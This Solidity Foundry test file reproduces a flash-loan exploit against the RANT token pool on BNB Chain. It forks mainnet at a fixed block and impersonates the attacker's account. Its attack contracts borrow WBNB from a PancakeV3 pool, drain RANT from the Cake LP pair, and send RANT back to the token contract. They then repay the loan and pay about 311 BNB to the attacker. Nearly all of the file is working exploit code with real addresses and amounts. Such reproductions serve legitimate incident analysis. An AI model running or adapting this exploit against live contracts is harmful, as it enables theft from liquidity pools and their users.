
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 52974381;
    uint256 constant TX_TIMESTAMP = 1751728596;
    uint256 constant TX_BLOCK_NUMBER = 52974382;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        RantAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (RantAttack attack) {
        _etchAttackRuntime();
        attack = RantAttack(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(RantAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild());
    }

    function _expectedAttackChild() internal pure returns (address) {
        return Addresses.attack_child;
    }

    function _executeAttack(RantAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(RantAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(RantAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 311475873604407652863);
        _expectProfit(Addresses.A_D3B0D8_E1A7, address(0), Addresses.ZERO, "BNB", 100000000000000000);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.RANT, "RANT", 91775453110499942020276462);
    }
}

contract RantAttack {
    AttackChild public attackChild;

    constructor() payable {
        _bindChild();
    }

    function _bindChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_child));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindChild();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _bindChild();
        _startChildFlow();
    }

    function _startChildFlow() public {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(address(attackChild)))._prepareAttackChild();
        AttackChild(payable(child)).startFlashLoan();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {


    bytes4 private constant PAIR_CALLBACK_SIG = bytes4(0x84800812);
    bool private pairRepayDone;
    bool private flashDone;
    mapping(uint256 => uint256) private entryCallbackCursor;

    receive() external payable {
        if (msg.sender == Addresses.A_10ED43_024E || msg.sender == address(this)) {
            pairSwapCallback();
        }
    }

    function pancakeV3FlashCallback(uint256 borrowed0, uint256 borrowed1, bytes calldata callbackData)
        external
        payable
    {
        borrowed0;
        borrowed1;
        callbackData;
        if (!flashDone) executeFlashFlow();
    }

    function start() external payable {
        requestFlashLoan();
    }

    fallback() external payable {
        if (msg.sig == PAIR_CALLBACK_SIG) {
            if (!pairRepayDone) repayPairWbnb();
            return;
        }
        pairSwapCallback();
    }

    function settleTokenFlows() external payable {
        if (!pairRepayDone) repayPairWbnb();
    }

    function flashCallback() external payable {
        if (!flashDone) executeFlashFlow();
    }

    function startFlashLoan() external payable {
        requestFlashLoan();
    }

    function pairSwapCallback() internal {
        if (msg.sender == Addresses.A_10ED43_024E || msg.sender == address(this)) skipPairCallback();
    }

    function skipPairCallback() internal {
        uint256 step = _nextEntryCb(3);
        if (step == 0) {
            return;
        }
        if (step == 1) {
            return;
        }
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = entryCallbackCursor[index];
        entryCallbackCursor[index] = ordinal + 1;
    }

    function repayPairWbnb() internal {
        pairRepayDone = true;
        IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP_BA1D, 2813769505544453342436);
    }

    function executeFlashFlow() internal {
        flashDone = true;
        approveRouter();
        drainRantPair();
        readPairRant();
        sendRantToToken();
        wrapNativeBnb();
        repayV3Pool();
        readWbnbProfit();
        unwrapAndCollect();
    }

    function approveRouter() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.A_10ED43_024E, type(uint256).max);
    }

    function drainRantPair() internal {
        bytes memory callbackData = hex"00000000000000000000000000000000000000000000009888e5694d8ba9c4e4";
        IUniswapV2PairLike(Addresses.Cake_LP_BA1D).swap(0, 96605739642631517916080650, address(this), callbackData);
    }

    function readPairRant() internal view {
        IERC20Like(Addresses.RANT).balanceOf(Addresses.Cake_LP_BA1D);
    }

    function sendRantToToken() internal {
        uint256 rantTransferAmount = 10733970071403501990675973;
        IERC20Like(Addresses.RANT).transfer(Addresses.RANT, rantTransferAmount);
    }

    function wrapNativeBnb() internal {
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 3125628148186415440634) depositAmount = 3125628148186415440634;
        if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
    }

    function repayV3Pool() internal {
        uint256 repaymentAmount = 2814050882495007787771;
        IERC20Like(Addresses.WBNB).transfer(Addresses.PancakeV3Pool, repaymentAmount);
    }

    function readWbnbProfit() internal view {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function unwrapAndCollect() internal {
        uint256 withdrawAmount = 311577265691407652863;
        IWBNB(Addresses.WBNB).withdraw(withdrawAmount);

        uint256 sideProfit = address(this).balance;
        if (sideProfit > 100000000000000000) sideProfit = 100000000000000000;
        (bool sideOk,) = payable(Addresses.A_D3B0D8_E1A7).call{value: sideProfit}("");
        sideOk;

        uint256 attackerProfit = address(this).balance;
        if (attackerProfit > 311477265691407652863) attackerProfit = 311477265691407652863;
        (bool attackerOk,) = payable(Addresses.attacker_eoa).call{value: attackerProfit}("");
        attackerOk;
    }

    function requestFlashLoan() internal {
        readPairBalance();
        borrowWbnb();
    }

    function readPairBalance() internal view {
        IERC20Like(Addresses.RANT).balanceOf(Addresses.Cake_LP_BA1D);
    }

    function borrowWbnb() internal {
        bytes memory callbackData = abi.encode(0x00000000000000000000009888e5694D8BA9C4E4);
        IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 0, 2813769505544453342436, callbackData);
    }

    function _prepareAttackChild() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant A_0A5C6E_BAEB = 0x0A5C6E7bE1BD17E928ce128a356064831D8CbAeB;
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant attack_contract = 0x1e2D48E640243b04a9Fa76Eb49080E9aB110b4ac;
    address internal constant A_1E619D_4809 = 0x1e619DbeA18F5E0e66D1c2dF3f14416d3c804809;
    address internal constant A_418D04_9D8F = 0x418d045493860a45F97f8D89E60B900862679D8f;
    address internal constant Cake_LP_BA1D = 0x42A93C3aF7Cb1BBc757dd2eC4977fd6D7916Ba1D;
    address internal constant A_559BEE_30FD = 0x559Bee76eC549e70630E451d46cB442eF5c230fD;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_7022FF_AC1B = 0x7022Ff59cC52f812cCf09986941378F6422cac1B;
    address internal constant A_96522A_25C5 = 0x96522aDC8D063b75d993bd9f7EA99a3AB19625C5;
    address internal constant A_9ADB8C_785A = 0x9AdB8c52f0d845739Fd3e035Ed230F0D4cBa785a;
    address internal constant attacker_eoa = 0xAD2Cb8f48E74065a0B884aF9C5a4ecbba101be23;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant RANT = 0xc321AC21A07B3d593B269AcdaCE69C3762CA2dd0;
    address internal constant A_D3B0D8_E1A7 = 0xD3b0d838cCCEAe7ebF1781D11D1bB741DB7Fe1A7;
    address internal constant A_F5F989_3FD1 = 0xF5f989C685E4435dd9402B28C2a30CAb1E463FD1;
    address internal constant attack_child = 0xFd9267eE6594bD8E82e8030c353870fA1773F7f8;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}
